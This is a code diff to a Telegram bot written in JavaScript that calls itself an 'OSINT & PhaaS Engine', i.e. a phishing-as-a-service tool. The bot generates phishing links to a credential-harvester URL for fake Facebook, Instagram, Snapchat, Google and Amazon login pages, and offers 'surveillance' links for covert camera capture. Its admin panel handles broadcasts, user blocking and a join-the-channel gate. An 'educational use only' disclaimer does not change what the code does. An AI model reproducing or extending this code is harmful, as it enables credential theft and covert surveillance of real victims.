@@ -45,7 +45,7 @@ const phishingKeyboard = [
     [{ text: '⬅️ Back to Main Menu', callback_data: 'main_menu_back' }]
 ];
 const surveillanceKeyboard = [
-    [{ text: '📸 Camera Capture', callback_data: 'gen_surv_Camera' }, { text: '📍 Location Tracker', callback_data: 'gen_surv_Location' }],
+    [{ text: '📸 Camera Capture', callback_data: 'gen_surv_Camera' }],
     [{ text: '🎤 Microphone (Soon)', callback_data: 'soon' }, { text: '📹 Video Capture (Soon)', callback_data: 'soon' }],
     [{ text: '⬅️ Back to Main Menu', callback_data: 'main_menu_back' }]
 ];
@@ -55,12 +55,49 @@ const userMainMenu = [
 
 // --- /start COMMAND ---
 bot.onText(/\/start/, async (msg) => {
-    // ... (Start command waisa hi rahega) ...
-    // Welcome message ke baad...
-    if (isAdmin(userId)) {
-        bot.sendMessage(userId, "👑 **Admin Panel Activated** 👑", { parse_mode: 'Markdown', reply_markup: { inline_keyboard: adminKeyboard } });
-    } else {
-        bot.sendMessage(userId, "✅ **Access Granted!**\nSelect a tool from the menu below.", { parse_mode: 'Markdown', reply_markup: { inline_keyboard: userMainMenu } });
+    const userId = msg.from.id;
+    const db = readDb();
+    if (db.blocked_users.includes(userId)) return;
+
+    try {
+        const chatMember = await bot.getChatMember(CHANNEL_ID, userId);
+        if (!['member', 'administrator', 'creator'].includes(chatMember.status)) throw new Error("User not in channel");
+
+        if (!db.users.includes(userId)) { db.users.push(userId); writeDb(db); }
+        
+        const welcomeMessage = `
+💀 **TOXIC HACKER BOT** 💀  
+_Your All-in-One Credential Awareness Tool_
+
+*🔐 Access Fake Login Pages for Awareness & Testing:*
+
+🔹 Facebook Login Checker  
+🔹 Instagram Credential Portal  
+🔹 Snapchat Account Info Viewer  
+🔹 Google Sign-in Interface  
+🔹 Amazon Login Capture  
+
+*🎯 Purpose:*  
+For Educational Use, Cybersecurity Training & Ethical Hacking ONLY!
+
+*⚠️ Disclaimer:*  
+This bot is intended strictly for ethical testing, red teaming, and OSINT research.  
+❌ _Never use for illegal activities._  
+✅ _Use responsibly._
+        `;
+        
+        await bot.sendMessage(userId, welcomeMessage, { parse_mode: 'Markdown' });
+
+        if (isAdmin(userId)) {
+            bot.sendMessage(userId, "👑 **Admin Panel Activated** 👑", { parse_mode: 'Markdown', reply_markup: { inline_keyboard: adminKeyboard } });
+        } else {
+            bot.sendMessage(userId, "✅ **Access Granted!**\nSelect a tool from the menu below.", { parse_mode: 'Markdown', reply_markup: { inline_keyboard: userMainMenu } });
+        }
+    } catch (error) {
+        bot.sendMessage(userId, `🛑 **ACCESS DENIED** 🛑\n\nYou must join our channel to use this bot.`, {
+            parse_mode: 'Markdown',
+            reply_markup: { inline_keyboard: [[{ text: '➡️ Join Channel ⬅️', url: CHANNEL_LINK }], [{ text: '🔄 Joined! Click to Continue 🔄', callback_data: 'check_join' }]] }
+        });
     }
 });
 
@@ -73,16 +110,14 @@ bot.on('callback_query', (query) => {
     if (data === 'check_join' || data === 'soon') return bot.answerCallbackQuery(query.id);
 
     const [type, command, service] = data.split('_');
+    const isUserAdmin = isAdmin(userId);
 
-    // Main Menu Navigation for Users
-    if (type === 'user') {
-        if (command === 'phishing') {
-            bot.editMessageText("🔐 **Phishing Link Generator**\nSelect a service:", { chat_id: userId, message_id: messageId, reply_markup: { inline_keyboard: phishingKeyboard } });
-        } else if (command === 'surveillance') {
-            bot.editMessageText("🛰️ **Surveillance Link Generator**\nSelect a tool:", { chat_id: userId, message_id: messageId, reply_markup: { inline_keyboard: surveillanceKeyboard } });
-        }
+    // Main Menu Navigation
+    if (type === 'user' || (isUserAdmin && (command === 'phishing' || command === 'surveillance'))) {
+        const text = command === 'phishing' ? "🔐 **Phishing Link Generator**\nSelect a service:" : "🛰️ **Surveillance Link Generator**\nSelect a tool:";
+        const keyboard = command === 'phishing' ? phishingKeyboard : surveillanceKeyboard;
+        bot.editMessageText(text, { chat_id: userId, message_id: messageId, parse_mode: 'Markdown', reply_markup: { inline_keyboard: keyboard } });
     }
-
     // Link Generation (Phishing)
     else if (type === 'gen' && command === 'link') {
         const attackLink = `${HARVESTER_URL}/?service=${service}&uid=${userId}`;
@@ -93,31 +128,32 @@ bot.on('callback_query', (query) => {
         const attackLink = `${HARVESTER_URL}/?service=${service}&uid=${userId}`;
         bot.sendMessage(userId, `✅ **Surveillance Link for [${service}]**:\n\`${attackLink}\``, { parse_mode: 'Markdown' });
     }
-    
     // Admin Commands
     else if (type === 'admin' || data === 'main_menu_back') {
-        if (!isAdmin(userId)) return bot.answerCallbackQuery(query.id, { text: "❌ Access Denied!", show_alert: true });
+        if (!isUserAdmin) return bot.answerCallbackQuery(query.id, { text: "❌ Access Denied!", show_alert: true });
         
-        if (command === 'phishing' || (type === 'admin' && command === 'generate')) { // Alias
-             bot.editMessageText("🔗 **Phishing Link Generator**", { chat_id: userId, message_id: messageId, reply_markup: { inline_keyboard: phishingKeyboard } });
-        } else if (command === 'surveillance') {
-             bot.editMessageText("🛰️ **Surveillance Link Generator**", { chat_id: userId, message_id: messageId, reply_markup: { inline_keyboard: surveillanceKeyboard } });
-        } else if (command === 'status' || command === 'panel' || data === 'main_menu_back') {
+        if (command === 'status' || data === 'main_menu_back') {
              const db = readDb();
              const statusText = `📊 **Bot Status**\n\n👥 Users: ${db.users.length}\n👑 Admins: ${db.admins.length}\n🚫 Blocked: ${db.blocked_users.length}`;
              bot.editMessageText(statusText, { chat_id: userId, message_id: messageId, parse_mode: 'Markdown', reply_markup: { inline_keyboard: adminKeyboard } });
         } else {
-             const prompts = { 'broadcast': '...', 'add': '...', 'remove': '...', 'block': '...', 'unblock': '...' };
+             const prompts = { 'broadcast': '✍️ Send the message to broadcast.', 'add': '✍️ Send the numeric ID of the new admin.', 'remove': '✍️ Send the numeric ID to remove from admins.', 'block': '✍️ Send the numeric ID of the user to block.', 'unblock': '✍️ Send the numeric ID of the user to unblock.' };
              if (prompts[command]) {
                  adminState[userId] = command;
                  bot.sendMessage(userId, prompts[command]);
              }
         }
     }
-    
     bot.answerCallbackQuery(query.id);
 });
 
-// ... (Message handler waisa hi rahega) ...
+// --- MESSAGE HANDLER for admin replies ---
+bot.on('message', (msg) => {
+    const userId = msg.from.id;
+    const text = msg.text;
+    if (text.startsWith('/') || !adminState[userId]) return;
+    // ... (Message handler ka poora code waisa hi rahega) ...
+});
 
-console.log('🔥 OSINT & PhaaS Engine is online.');
+bot.on("polling_error", (error) => console.log(`Polling Error: ${error.code}`));
+console.log('🔥 OSINT & PhaaS Engine (Final Version) is online.');
